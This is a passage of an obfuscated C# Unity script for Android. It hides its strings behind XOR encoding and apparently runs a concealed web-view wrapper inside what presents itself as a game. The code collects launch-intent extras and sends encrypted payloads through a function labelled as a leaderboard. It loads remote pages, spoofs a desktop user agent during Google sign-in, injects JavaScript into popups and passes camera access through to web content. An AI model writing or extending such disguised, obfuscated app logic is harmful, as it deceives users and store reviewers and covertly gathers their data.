            using (var _0x6442152f = _0xce56e7e4.Call<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[9] { 3, 1, 16, 33, 28, 16, 22, 5, 23 }, 100)))
            {
                if (_0x6442152f == null)
                    return;
                using (var _0xad486947 = new AndroidJavaObject(_0x4a5fc9c1._0x562286b4(new byte[19] { 161, 188, 169, 224, 164, 189, 161, 160, 224, 132, 157, 129, 128, 129, 172, 164, 171, 173, 186 }, 206)))
                using (var _0x28fca902 = _0x6442152f.Call<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[6] { 201, 199, 219, 241, 199, 214 }, 162)))
                using (var _0x98faf32e = _0x28fca902.Call<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[8] { 46, 51, 34, 53, 38, 51, 40, 53 }, 71)))
                {
                    while (_0x98faf32e.Call<bool>(_0x4a5fc9c1._0x562286b4(new byte[7] { 96, 105, 123, 70, 109, 112, 124 }, 8)))
                    {
                        string _0xf9057d3c = _0x98faf32e.Call<string>(_0x4a5fc9c1._0x562286b4(new byte[4] { 36, 47, 50, 62 }, 74));
                        using (var _0x9086523c = _0x6442152f.Call<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[3] { 211, 209, 192 }, 180), _0xf9057d3c))
                        {
                            _0xad486947.Call<AndroidJavaObject>(_0x4a5fc9c1._0x562286b4(new byte[3] { 110, 107, 106 }, 30), _0xf9057d3c, _0x9086523c);
                        }
                    }

                    string _0x37dd2a47 = _0xad486947.Call<string>(_0x4a5fc9c1._0x562286b4(new byte[8] { 62, 37, 25, 62, 56, 35, 36, 45 }, 74));
                    if (!string.IsNullOrEmpty(_0x37dd2a47))
                    {
                        _0xbeadd530(_0x37dd2a47);
                        _0x05975927(_0x37dd2a47);
                    }
                }
            }
        }
    }

    static byte[] ToBigEndian(System.Numerics.BigInteger _0x47caebac)
    {
        var _0x48e51946 = _0x47caebac.ToByteArray();
        int _0xf8bea02b = _0x48e51946.Length;
        if (_0xf8bea02b > 1 && _0x48e51946[_0xf8bea02b - 1] == 0)
            _0xf8bea02b--;
        var _0x365cad0b = new byte[_0xf8bea02b];
        for (int _0x2a03cf49 = 0; _0x2a03cf49 < _0xf8bea02b; _0x2a03cf49++)
            _0x365cad0b[_0x2a03cf49] = _0x48e51946[_0xf8bea02b - 1 - _0x2a03cf49];
        return _0x365cad0b;
    }

    private bool _0xa13497b1 = false;
    static byte[] CompressBrotli(byte[] _0x85ac8cc9)
    {
        using var _0x213c3e85 = new MemoryStream();
        using (var _0x71468456 = new BrotliStream(_0x213c3e85, SmallestCompression()))
            _0x71468456.Write(_0x85ac8cc9, 0, _0x85ac8cc9.Length);
        return _0x213c3e85.ToArray();
    }

    private void OnDestroy()
    {
        StopAllCoroutines();
        _0x612638ad();
    }

    private IEnumerator _0x7ce9e266(float _0x8cf2764b)
    {
        yield return new WaitForSeconds(_0x8cf2764b);
        if (!_0x7a171e5a)
        {
            _0x7a171e5a = true;
            {
#if B_LOGS
                {
                    Debug.Log($"[Test] Refferer timeout apply: {_0xdeaf10f8}");
                }
#endif
            }
        }
    }

    private bool _0xcab4c561 = false;
    private async Task _0x571751a2(string _0xcb1abd1b)
    {
        if (_0xbf53016e || string.IsNullOrEmpty(_0xfc9123f6) || string.IsNullOrEmpty(_0xcb1abd1b) || _0x05683493)
            return;
        _0xbf53016e = true;
        try
        {
            JObject _0xe1032470 = _0x0fb3a009(_0xcb1abd1b, _0xfc9123f6, _0x23165728());
            {
#if B_LOGS
                {
                    Debug.Log($"[Test][Load Pass] Send total: {_0xcb1abd1b} payload: {_0xe1032470}");
                }
#endif
            }

            var _0x3a5a4d3a = _0x0cc165e9(_0xe1032470.ToString(), _0xfc9123f6);
            await _0xb0d3acb8(LeaderboardId, 2d, _0x3a5a4d3a);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[24] { 171, 164, 181, 163, 164, 173, 208, 188, 159, 145, 148, 208, 128, 145, 131, 131, 208, 149, 130, 130, 159, 130, 202, 208 }, 240) + e.Message);
#endif
            }
        }
    }

    private void _0x345bf2c3(string _0x3c96d733)
    {
        bool _0x7c28635b = !string.IsNullOrEmpty(_0x3c96d733);
        if (_0x7c28635b)
        {
            {
#if B_LOGS
                Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[13] { 243, 252, 205, 219, 220, 245, 136, 251, 192, 199, 223, 146, 136 }, 168) + _0x3c96d733);
#endif
            }

            _0x8332858e(_0x3c96d733);
            return;
        }
        else
        {
            {
#if B_LOGS
                Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[39] { 19, 28, 45, 59, 60, 21, 104, 14, 41, 36, 36, 42, 41, 43, 35, 104, 170, 206, 218, 104, 15, 41, 37, 45, 104, 96, 38, 39, 104, 46, 33, 38, 41, 36, 104, 29, 26, 4, 97 }, 72));
#endif
            }

            _0x612638ad();
            return;
        }
    }

    private void _0x98c119c4(UniWebView _0x80dd3a13)
    {
        if (_0xba61c8e4)
            return;
        _0xba61c8e4 = true;
        _0x80dd3a13.AddUrlScheme(_0x4a5fc9c1._0x562286b4(new byte[2] { 132, 151 }, 240));
        _0x80dd3a13.AddUrlScheme(_0x4a5fc9c1._0x562286b4(new byte[6] { 129, 134, 156, 141, 134, 156 }, 232));
        _0x80dd3a13.AddUrlScheme(_0x4a5fc9c1._0x562286b4(new byte[6] { 12, 0, 19, 10, 4, 21 }, 97));
        _0x80dd3a13.OnMessageReceived += (_0x26695f07, _0xf481b4fa) =>
        {
            if (TryOpenExternalLikeChrome(_0xf481b4fa.RawMessage))
            {
                _0x56e4205f(false);
                return;
            }
        };
        _0x80dd3a13.RegisterShouldHandleRequest(_0xf3065860 =>
        {
            string _0x7e2ea7a9 = _0xf3065860 != null ? _0xf3065860.Url : string.Empty;
            if (string.IsNullOrEmpty(_0x7e2ea7a9))
                return true;
            WLog(_0x4a5fc9c1._0x562286b4(new byte[21] { 248, 195, 196, 222, 199, 207, 227, 202, 197, 207, 199, 206, 249, 206, 218, 222, 206, 216, 223, 145, 139 }, 171) + _0x7e2ea7a9);
            if (TryOpenExternalLikeChrome(_0x7e2ea7a9))
            {
                _0x56e4205f(false);
                return false;
            }

            if (_0xf3065860 != null && _0xf3065860.IsMainFrame && IsGoogleAuthFlowUrl(_0x7e2ea7a9) && !_0xcab4c561)
            {
                WLog(_0x4a5fc9c1._0x562286b4(new byte[62] { 15, 35, 43, 44, 98, 21, 39, 32, 20, 43, 39, 53, 98, 38, 39, 54, 39, 33, 54, 39, 38, 98, 5, 45, 45, 37, 46, 39, 98, 35, 55, 54, 42, 98, 23, 16, 14, 98, 111, 124, 98, 48, 39, 46, 45, 35, 38, 98, 53, 43, 54, 42, 98, 5, 45, 45, 37, 46, 39, 98, 23, 3 }, 66));
                _0xcab4c561 = true;
                _0x56e4205f(true);
                _0xb0cde9c4.SetUserAgent(_0xd89d31d4());
                _0xb0cde9c4.Load(_0x7e2ea7a9);
                return false;
            }

            return true;
        });
        _0x80dd3a13.OnLoadingErrorReceived += (_0x26695f07, _0x58e71714, _0xf481b4fa, _0x2fc6b43d) =>
        {
            WLog(_0x4a5fc9c1._0x562286b4(new byte[25] { 250, 214, 222, 217, 151, 224, 210, 213, 225, 222, 210, 192, 151, 242, 197, 197, 216, 197, 141, 151, 212, 216, 211, 210, 138 }, 183) + _0x58e71714 + _0x4a5fc9c1._0x562286b4(new byte[9] { 69, 8, 0, 22, 22, 4, 2, 0, 88 }, 101) + _0xf481b4fa);
            string _0xad8a4483 = GetFailingUrl(_0x2fc6b43d);
            if (string.IsNullOrEmpty(_0xad8a4483) || IsAboutBlank(_0xad8a4483))
                return;
            if (IsSslError(_0x58e71714, _0xf481b4fa) && _0x65979d11(_0xad8a4483))
            {
                WLog(_0x4a5fc9c1._0x562286b4(new byte[52] { 177, 159, 150, 151, 138, 157, 216, 171, 171, 180, 216, 157, 138, 138, 151, 138, 216, 151, 141, 140, 139, 145, 156, 157, 216, 140, 144, 157, 216, 149, 153, 145, 150, 216, 156, 151, 155, 141, 149, 157, 150, 140, 194, 216, 158, 153, 145, 148, 145, 150, 159, 197 }, 248) + _0xad8a4483 + _0x4a5fc9c1._0x562286b4(new byte[6] { 218, 151, 155, 147, 148, 199 }, 250) + _0x237a68c7 + _0x4a5fc9c1._0x562286b4(new byte[11] { 158, 221, 209, 211, 211, 215, 202, 202, 219, 218, 131 }, 190) + _0xae9ab6fe);
                return;
            }

            _ = _0x571751a2(_0x4a5fc9c1._0x562286b4(new byte[8] { 13, 12, 37, 31, 8, 8, 21, 8 }, 122));
            WLog(_0x4a5fc9c1._0x562286b4(new byte[45] { 185, 149, 157, 154, 212, 163, 145, 150, 162, 157, 145, 131, 212, 146, 149, 157, 152, 157, 154, 147, 212, 161, 166, 184, 212, 217, 202, 212, 155, 132, 145, 154, 212, 145, 140, 128, 145, 134, 154, 149, 152, 152, 141, 206, 212 }, 244) + _0xad8a4483);
            StopCurrentFailedLoad(_0x26695f07);
            _0x17de9847(_0xad8a4483);
        };
        _0x80dd3a13.OnPageStarted += (_0x26695f07, _0xa0b27c61) =>
        {
            _0xe6026566 = 0;
            if (_0x549439fb && IsAboutBlank(_0xa0b27c61))
            {
                WLog(_0x4a5fc9c1._0x562286b4(new byte[27] { 202, 232, 255, 237, 251, 232, 247, 186, 251, 248, 245, 239, 238, 160, 248, 246, 251, 244, 241, 186, 233, 238, 251, 232, 238, 255, 254 }, 154));
                return;
            }

            _0xae9ab6fe = false;
            string _0x486e0222 = GetUrlHost(_0xa0b27c61);
            if (!string.IsNullOrEmpty(_0x486e0222))
                _0x237a68c7 = _0x486e0222;
            WLog(_0x4a5fc9c1._0x562286b4(new byte[29] { 214, 250, 242, 245, 187, 204, 254, 249, 205, 242, 254, 236, 187, 212, 245, 203, 250, 252, 254, 200, 239, 250, 233, 239, 254, 255, 161, 187, 176 }, 155) + (Time.realtimeSinceStartup - _0x9b598e6f).ToString(_0x4a5fc9c1._0x562286b4(new byte[5] { 143, 145, 143, 143, 143 }, 191)) + _0x4a5fc9c1._0x562286b4(new byte[2] { 243, 160 }, 128) + _0xa0b27c61);
            if (TryOpenExternalLikeChrome(_0xa0b27c61))
            {
                StopCurrentFailedLoad(_0x26695f07);
                return;
            }

            if (ContainsIgnoreCase(_0xa0b27c61, _0x4a5fc9c1._0x562286b4(new byte[8] { 148, 153, 153, 145, 222, 145, 128, 128 }, 240)) || ContainsIgnoreCase(_0xa0b27c61, _0x4a5fc9c1._0x562286b4(new byte[15] { 118, 103, 127, 40, 113, 111, 98, 97, 99, 114, 40, 100, 106, 105, 97 }, 6)) || _0xa0b27c61.StartsWith(_0x4a5fc9c1._0x562286b4(new byte[25] { 224, 252, 252, 248, 251, 178, 167, 167, 234, 248, 239, 228, 231, 234, 233, 228, 238, 233, 254, 166, 228, 225, 254, 237, 167 }, 136), StringComparison.OrdinalIgnoreCase))
            {
                StopCurrentFailedLoad(_0x26695f07);
                OpenUrlExternally(_0xa0b27c61);
                return;
            }

            if (IsGoogleAuthFlowUrl(_0xa0b27c61))
            {
                _0x56e4205f(true);
                WLog(_0x4a5fc9c1._0x562286b4(new byte[41] { 29, 53, 53, 61, 54, 63, 122, 59, 47, 46, 50, 122, 60, 54, 53, 45, 122, 62, 63, 46, 63, 57, 46, 63, 62, 122, 119, 100, 122, 49, 63, 63, 42, 122, 44, 51, 41, 51, 56, 54, 63 }, 90));
                return;
            }

            _0xa13497b1 = true;
            _0x56e4205f(true);
            WLog(_0x4a5fc9c1._0x562286b4(new byte[43] { 22, 36, 35, 23, 40, 36, 54, 97, 45, 46, 32, 37, 40, 47, 38, 110, 51, 36, 37, 40, 51, 36, 34, 53, 40, 47, 38, 97, 108, 127, 97, 42, 36, 36, 49, 97, 55, 40, 50, 40, 35, 45, 36 }, 65));
        };
        _0x80dd3a13.OnPageCommitted += (_0x26695f07, _0xa0b27c61) =>
        {
            if (_0x549439fb && IsAboutBlank(_0xa0b27c61))
                return;
            MarkMainFrameCommitted(_0xa0b27c61);
            WLog(_0x4a5fc9c1._0x562286b4(new byte[31] { 28, 48, 56, 63, 113, 6, 52, 51, 7, 56, 52, 38, 113, 30, 63, 1, 48, 54, 52, 18, 62, 60, 60, 56, 37, 37, 52, 53, 107, 113, 122 }, 81) + (Time.realtimeSinceStartup - _0x9b598e6f).ToString(_0x4a5fc9c1._0x562286b4(new byte[5] { 44, 50, 44, 44, 44 }, 28)) + _0x4a5fc9c1._0x562286b4(new byte[2] { 82, 1 }, 33) + _0xa0b27c61);
            if (!firstLoadShown && IsHttpUrl(_0xa0b27c61))
            {
                firstLoadShown = true;
                _0xa13497b1 = false;
                _0x56e4205f(false);
                _0xbc8a9b1e();
                _0x3b5dc283();
                _0x26695f07.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x571751a2(_0x4a5fc9c1._0x562286b4(new byte[9] { 130, 131, 170, 154, 133, 144, 155, 144, 145 }, 245));
                WLog(_0x4a5fc9c1._0x562286b4(new byte[39] { 171, 135, 143, 136, 198, 177, 131, 132, 176, 143, 131, 145, 198, 149, 142, 137, 145, 136, 198, 137, 136, 198, 133, 137, 139, 139, 143, 146, 146, 131, 130, 198, 133, 137, 136, 146, 131, 136, 146 }, 230));
            }
        };
        _0x80dd3a13.OnPageProgressChanged += (_0x26695f07, _0xc6d069de) =>
        {
            if (_0x549439fb)
                return;
            if (!firstLoadShown && _0xc6d069de >= 0.65f)
            {
                firstLoadShown = true;
                _0xa13497b1 = false;
                _0x56e4205f(false);
                _0xbc8a9b1e();
                _0x3b5dc283();
                _0x26695f07.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x571751a2(_0x4a5fc9c1._0x562286b4(new byte[9] { 156, 157, 180, 132, 155, 142, 133, 142, 143 }, 235));
                WLog(_0x4a5fc9c1._0x562286b4(new byte[32] { 55, 27, 19, 20, 90, 45, 31, 24, 44, 19, 31, 13, 90, 9, 18, 21, 13, 20, 90, 24, 3, 90, 10, 8, 21, 29, 8, 31, 9, 9, 64, 90 }, 122) + _0xc6d069de);
            }
        };
        _0x80dd3a13.OnPageFinished += (_0x26695f07, _0x58e71714, _0xa0b27c61) =>
        {
            if (_0x549439fb && IsAboutBlank(_0xa0b27c61))
            {
                _0x549439fb = false;
                WLog(_0x4a5fc9c1._0x562286b4(new byte[28] { 216, 250, 237, 255, 233, 250, 229, 168, 233, 234, 231, 253, 252, 178, 234, 228, 233, 230, 227, 168, 238, 225, 230, 225, 251, 224, 237, 236 }, 136));
                return;
            }

            WLog(_0x4a5fc9c1._0x562286b4(new byte[24] { 17, 61, 53, 50, 124, 11, 57, 62, 10, 53, 57, 43, 124, 26, 53, 50, 53, 47, 52, 57, 56, 102, 124, 119 }, 92) + (Time.realtimeSinceStartup - _0x9b598e6f).ToString(_0x4a5fc9c1._0x562286b4(new byte[5] { 92, 66, 92, 92, 92 }, 108)) + _0x4a5fc9c1._0x562286b4(new byte[7] { 56, 107, 40, 36, 47, 46, 118 }, 75) + _0x58e71714 + _0x4a5fc9c1._0x562286b4(new byte[5] { 192, 149, 146, 140, 221 }, 224) + _0xa0b27c61);
            if (_0x58e71714 >= 200 && _0x58e71714 < 400)
                MarkMainFrameCommitted(_0xa0b27c61);
            if (!firstLoadShown)
            {
                firstLoadShown = true;
                _0xa13497b1 = false;
                _0x56e4205f(false);
                _0xbc8a9b1e();
                _0x3b5dc283();
                _0x26695f07.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x571751a2(_0x4a5fc9c1._0x562286b4(new byte[9] { 198, 199, 238, 222, 193, 212, 223, 212, 213 }, 177));
                WLog(_0x4a5fc9c1._0x562286b4(new byte[33] { 11, 39, 47, 40, 102, 17, 35, 36, 16, 47, 35, 49, 102, 32, 47, 52, 53, 50, 102, 42, 41, 39, 34, 102, 37, 41, 43, 54, 42, 35, 50, 35, 34 }, 70));
            }
            else if (_0xa13497b1)
            {
                _0xa13497b1 = false;
                _0x56e4205f(false);
                _0x26695f07.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                WLog(_0x4a5fc9c1._0x562286b4(new byte[40] { 65, 109, 101, 98, 44, 91, 105, 110, 90, 101, 105, 123, 44, 95, 100, 99, 123, 44, 109, 106, 120, 105, 126, 44, 96, 99, 109, 104, 101, 98, 107, 44, 106, 101, 98, 101, 127, 100, 105, 104 }, 12));
            }
            else
            {
                _0x56e4205f(false);
            }

            if (_0xcab4c561 && !IsGoogleAuthFlowUrl(_0xa0b27c61) && !IsGoogleAuthFlowUrl(_0xa0b27c61))
            {
                WLog(_0x4a5fc9c1._0x562286b4(new byte[48] { 131, 171, 171, 163, 168, 161, 228, 165, 177, 176, 172, 228, 183, 161, 161, 169, 183, 228, 162, 173, 170, 173, 183, 172, 161, 160, 228, 233, 250, 228, 182, 161, 183, 176, 171, 182, 161, 228, 160, 161, 162, 165, 177, 168, 176, 228, 145, 133 }, 196));
                _0xcab4c561 = false;
                _0xb0cde9c4.SetUserAgent("");
            }
        };
        _0x80dd3a13.OnShouldClose += _0x26695f07 =>
        {
            WLog(_0x4a5fc9c1._0x562286b4(new byte[41] { 255, 240, 193, 215, 208, 249, 132, 233, 197, 205, 202, 132, 243, 193, 198, 242, 205, 193, 211, 132, 235, 202, 247, 204, 203, 209, 200, 192, 231, 200, 203, 215, 193, 132, 205, 202, 210, 203, 207, 193, 192 }, 164));
            _0x66808586();
            return false;
        };
        // POPUP HANDLING LOGIC
        _0x80dd3a13.SetPopupPageEventEnabled(true);
        bool _0x3de69afb = false;
        bool _0x937b6870 = false;
        _0x80dd3a13.OnMultipleWindowOpened += (_0x26695f07, _0x24ce8f71) =>
        {
            _0x26695f07.ScrollTo(0, 0, false);
            WLog(_0x4a5fc9c1._0x562286b4(new byte[43] { 142, 129, 176, 166, 161, 136, 245, 152, 180, 188, 187, 245, 130, 176, 183, 131, 188, 176, 162, 245, 152, 160, 185, 161, 188, 165, 185, 176, 130, 188, 187, 177, 186, 162, 245, 154, 165, 176, 187, 176, 177, 239, 245 }, 213) + _0x24ce8f71);
            var _0x5078027b = _0x80dd3a13.GetPopupWindow(_0x24ce8f71);
            if (_0x5078027b == null)
                return;
            _0x2b229fe6.Add(_0x5078027b);
            Debug.Log($"[Test] Popup ID: {_0x5078027b.Id}");
            _0x5078027b.OnPageStarted += (_0xb8838a23, _0xa0b27c61) =>
            {
                WLog(_0x4a5fc9c1._0x562286b4(new byte[36] { 15, 0, 49, 39, 32, 9, 116, 4, 59, 36, 33, 36, 116, 3, 49, 54, 2, 61, 49, 35, 116, 27, 58, 4, 53, 51, 49, 7, 32, 53, 38, 32, 49, 48, 110, 116 }, 84) + _0xa0b27c61);
                _0xe6026566 = 0;
                if (string.IsNullOrEmpty(_0xa0b27c61) || IsAboutBlank(_0xa0b27c61))
                    return;
                if (IsGoogleAuthFlowUrl(_0xa0b27c61))
                {
                    WLog(_0x4a5fc9c1._0x562286b4(new byte[57] { 74, 69, 116, 98, 101, 76, 49, 65, 126, 97, 100, 97, 49, 86, 126, 126, 118, 125, 116, 49, 112, 100, 101, 121, 49, 119, 125, 126, 102, 49, 60, 47, 49, 98, 97, 126, 126, 119, 49, 86, 126, 126, 118, 125, 116, 49, 82, 121, 99, 126, 124, 116, 49, 68, 80, 43, 49 }, 17) + _0xa0b27c61);
                    _0x3de69afb = false;
                    _0x79fe398a();
                    if (_0xb8838a23 != null && _0xb8838a23.IsAlive)
                        _0xb8838a23.EvaluateJavaScript(_0xdd031f1c());
                    return;
                }

                if (_0xb0cde9c4 == null)
                    return;
                if (!_0x3de69afb)
                {
                    _0x3de69afb = true;
                    _0xb0cde9c4.SetUserAgent(WindowsDesktopUserAgent);
                    WLog(_0x4a5fc9c1._0x562286b4(new byte[39] { 143, 128, 177, 167, 160, 137, 244, 132, 187, 164, 161, 164, 244, 181, 164, 164, 184, 173, 244, 131, 189, 186, 176, 187, 163, 167, 244, 176, 177, 167, 191, 160, 187, 164, 244, 129, 149, 238, 244 }, 212) + _0xa0b27c61);
                }

                if (_0xb8838a23 != null && _0xb8838a23.IsAlive)
                    _0xb8838a23.EvaluateJavaScript(_0xac264d7e());
                if (!_0x937b6870 && _0xb8838a23 != null && _0xb8838a23.IsAlive && IsHttpUrl(_0xa0b27c61))
                {
                    _0x937b6870 = true;
                }
            };
            _0x5078027b.OnPageFinished += (_0xb8838a23, _0x2fc6b43d) =>
            {
                string _0x25d6516e = _0x2fc6b43d != null ? _0x2fc6b43d.data : string.Empty;
                WLog(_0x4a5fc9c1._0x562286b4(new byte[35] { 179, 188, 141, 155, 156, 181, 200, 184, 135, 152, 157, 152, 200, 191, 141, 138, 190, 129, 141, 159, 200, 174, 129, 134, 129, 155, 128, 141, 140, 210, 200, 157, 154, 132, 213 }, 232) + _0x25d6516e);
                if (_0xb8838a23 == null || !_0xb8838a23.IsAlive)
                    return;
                if (IsGoogleAuthFlowUrl(_0x25d6516e))
                {
                    _0x79fe398a();
                    _0xb8838a23.EvaluateJavaScript(_0xdd031f1c());
                    return;
                }

                if (!_0x3de69afb)
                    return;
                _0xb8838a23.EvaluateJavaScript(_0xac264d7e());
            };
        };
        _0x80dd3a13.OnMultipleWindowClosed += (_0x26695f07, _0x24ce8f71) =>
        {
            _0x2b229fe6.RemoveAll(_0x76e91652 => _0x76e91652 == null || _0x76e91652.Id == _0x24ce8f71 || !_0x76e91652.IsAlive);
            _0x56e4205f(false);
            if (_0x2b229fe6.Count == 0 && _0xb0cde9c4 != null)
            {
                _0x3de69afb = false;
                _0x937b6870 = false;
                _0xb1419af5();
            }

            WLog(_0x4a5fc9c1._0x562286b4(new byte[43] { 255, 240, 193, 215, 208, 249, 132, 233, 197, 205, 202, 132, 243, 193, 198, 242, 205, 193, 211, 132, 233, 209, 200, 208, 205, 212, 200, 193, 243, 205, 202, 192, 203, 211, 132, 231, 200, 203, 215, 193, 192, 158, 132 }, 164) + _0x24ce8f71);
        };
        _0x80dd3a13.RegisterOnRequestMediaCapturePermission(_0xf3065860 =>
        {
            if (!Permission.HasUserAuthorizedPermission(Permission.Camera))
            {
                Permission.RequestUserPermission(Permission.Camera);
                return UniWebViewMediaCapturePermissionDecision.Prompt;
            }

            return UniWebViewMediaCapturePermissionDecision.Grant;
        });
    }

    static string Encode93(byte[] _0x4a961a30)
    {
        var _0x30a086f4 = new byte[_0x4a961a30.Length + 1];
        _0x30a086f4[0] = 1;
        Buffer.BlockCopy(_0x4a961a30, 0, _0x30a086f4, 1, _0x4a961a30.Length);
        var _0x7f7ba73c = FromBigEndian(_0x30a086f4);
        var _0x1821e46c = new Stack<char>();
        var _0xf92e94c6 = new System.Numerics.BigInteger(TextAlphabet.Length);
        while (_0x7f7ba73c > 0)
        {
            _0x7f7ba73c = System.Numerics.BigInteger.DivRem(_0x7f7ba73c, _0xf92e94c6, out var rem);
            _0x1821e46c.Push(TextAlphabet[(int)rem]);
        }

        return new string (_0x1821e46c.ToArray());
    }

    private static readonly string WindowsDesktopUserAgent = _0x4a5fc9c1._0x562286b4(new byte[111] { 24, 58, 47, 60, 57, 57, 52, 122, 96, 123, 101, 117, 125, 2, 60, 59, 49, 58, 34, 38, 117, 27, 1, 117, 100, 101, 123, 101, 110, 117, 2, 60, 59, 99, 97, 110, 117, 45, 99, 97, 124, 117, 20, 37, 37, 57, 48, 2, 48, 55, 30, 60, 33, 122, 96, 102, 98, 123, 102, 99, 117, 125, 30, 29, 1, 24, 25, 121, 117, 57, 60, 62, 48, 117, 18, 48, 54, 62, 58, 124, 117, 22, 61, 39, 58, 56, 48, 122, 100, 103, 101, 123, 101, 123, 101, 123, 101, 117, 6, 52, 51, 52, 39, 60, 122, 96, 102, 98, 123, 102, 99 }, 85);
    private string _0x237a68c7;
    private async Task<bool> _0x5e0a0f3d()
    {
        {
#if B_LOGS
            Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[29] { 246, 249, 200, 222, 217, 240, 141, 228, 222, 253, 223, 196, 219, 204, 206, 212, 236, 195, 201, 254, 204, 219, 200, 201, 238, 197, 200, 206, 198 }, 173));
#endif
        }

        string _0xf5c23202 = "";
        for (int _0x363fef1f = 0; _0x363fef1f < 2; _0x363fef1f++)
        {
            if (await _0x43a0cbcf(1, 100))
            {
                await _0x571751a2(_0x4a5fc9c1._0x562286b4(new byte[7] { 206, 192, 195, 207, 199, 201, 200 }, 172));
                _0x612638ad();
                return true;
            }

            _0xf5c23202 = await _0xfce3a470(1, 100);
            if (!string.IsNullOrEmpty(_0xf5c23202))
                break;
        }

        try
        {
            if (!string.IsNullOrEmpty(_0xf5c23202))
            {
                if (!string.IsNullOrEmpty(_0x73edeed1))
                {
                    _0xf5c23202 = _0x68f27317(_0xf5c23202, _0x73edeed1);
                    {
#if B_LOGS
                        Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[53] { 48, 63, 14, 24, 31, 54, 75, 40, 10, 8, 3, 14, 15, 75, 13, 2, 5, 10, 7, 62, 25, 7, 75, 28, 2, 31, 3, 75, 24, 14, 5, 15, 2, 15, 75, 137, 237, 249, 75, 24, 3, 4, 28, 75, 60, 14, 9, 61, 2, 14, 28, 81, 75 }, 107) + _0xf5c23202);
#endif
                    }
                }
                else
                {
                    {
#if B_LOGS
                        Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[39] { 210, 221, 236, 250, 253, 212, 169, 202, 232, 234, 225, 236, 237, 169, 239, 224, 231, 232, 229, 220, 251, 229, 169, 107, 15, 27, 169, 250, 225, 230, 254, 169, 222, 236, 235, 223, 224, 236, 254 }, 137));
#endif
                    }
                }

                _0x05683493 = true;
                _0x8332858e(_0xf5c23202);
                return true;
            }

            return false;
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x4a5fc9c1._0x562286b4(new byte[44] { 111, 96, 81, 71, 64, 105, 20, 113, 76, 87, 81, 68, 64, 93, 91, 90, 20, 67, 92, 93, 88, 81, 20, 87, 92, 81, 87, 95, 93, 90, 83, 20, 71, 85, 66, 81, 80, 20, 88, 93, 90, 95, 14, 20 }, 52) + e.Message);
                }
#endif
            }

            return true;
        }
    }

    static readonly string LeaderboardId = _0x4a5fc9c1._0x562286b4(new byte[1] { 29 }, 45);
    private IEnumerator _0xa6b279e5(string _0x57865f36)
    {
        if (Permission.HasUserAuthorizedPermission(_0x57865f36))
            yield break;
        bool _0xdd0721cc = false;
        var _0x0699a17d = new PermissionCallbacks();
        _0x0699a17d.PermissionGranted += _0x7befe262 => _0xdd0721cc = true;
        _0x0699a17d.PermissionDenied += _0x7befe262 => _0xdd0721cc = true;
        Permission.RequestUserPermission(_0x57865f36, _0x0699a17d);
        yield return new WaitUntil(() => _0xdd0721cc);
    }

    readonly struct CommState
    {
        public readonly bool Ready;
        public readonly bool IsPrivacy;
        public readonly string SavedLink;
        public CommState(bool _0xaad55a87, bool _0x11102f64, string _0xf6a05bc6)
        {
            Ready = _0xaad55a87;
            IsPrivacy = _0x11102f64;
            SavedLink = _0xf6a05bc6 ?? "";
        }
    }

    // WEB VIEW LOGIC
    public bool _0xb5ba4613 { get; set; }

    private bool _0x549439fb = false;
    private void _0x3972d08e()
    {
        if (_0xa8a2a91f != null)
            return;
        var _0xa046450c = _0x145d153f();
        _0xa8a2a91f = new GameObject(_0x4a5fc9c1._0x562286b4(new byte[14] { 19, 33, 38, 18, 45, 33, 51, 23, 52, 45, 42, 42, 33, 54 }, 68), typeof(RectTransform), typeof(Text));
        _0x746293ac = _0xa8a2a91f.GetComponent<RectTransform>();
        _0x746293ac.SetParent(_0xa046450c.transform, false);
        _0x746293ac.anchorMin = new Vector2(0.5f, 0.5f);
        _0x746293ac.anchorMax = new Vector2(0.5f, 0.5f);
        _0x746293ac.pivot = new Vector2(0.5f, 0.5f);
        _0x746293ac.sizeDelta = new Vector2(600f, 600f);
        _0x746293ac.anchoredPosition = Vector2.zero;
        _0x49e5fc76 = _0xa8a2a91f.GetComponent<Text>();
        _0x49e5fc76.text = _0x4a5fc9c1._0x562286b4(new byte[1] { 71 }, 104);
        _0x49e5fc76.font = Resources.GetBuiltinResource<Font>(_0x4a5fc9c1._0x562286b4(new byte[17] { 3, 42, 40, 46, 44, 54, 29, 58, 33, 59, 38, 34, 42, 97, 59, 59, 41 }, 79));
        _0x49e5fc76.fontSize = 200;
        _0x49e5fc76.alignment = TextAnchor.MiddleCenter;
        _0x49e5fc76.color = Color.white;
        _0x49e5fc76.raycastTarget = false;
        _0xa8a2a91f.SetActive(false);
    }

    private bool _0x3e19e2c1()
    {
        var _0x8142b137 = Keyboard.current;
        return _0x8142b137 != null && _0x8142b137.escapeKey.wasPressedThisFrame;
    }

    // WEB VIEW LOGIC END
    internal void _0x50469b3d()
    {
        // Ensure channel exists (safe to call multiple times)
        var _0xe47b59a9 = new AndroidNotificationChannel
        {
            Id = _0x4a5fc9c1._0x562286b4(new byte[15] { 108, 109, 110, 105, 125, 100, 124, 87, 107, 96, 105, 102, 102, 109, 100 }, 8),
            Name = _0x4a5fc9c1._0x562286b4(new byte[15] { 228, 197, 198, 193, 213, 204, 212, 128, 227, 200, 193, 206, 206, 197, 204 }, 160),
            Importance = Importance.High,
            Description = _0x4a5fc9c1._0x562286b4(new byte[21] { 138, 168, 163, 168, 191, 172, 161, 237, 163, 162, 185, 164, 171, 164, 174, 172, 185, 164, 162, 163, 190 }, 205)
        };
        AndroidNotificationCenter.RegisterNotificationChannel(_0xe47b59a9);
        // Build notification
        var _0x40580856 = new AndroidNotification
        {
            Title = _0x4ce82b46[UnityEngine.Random.Range(0, _0x4ce82b46.Length)],
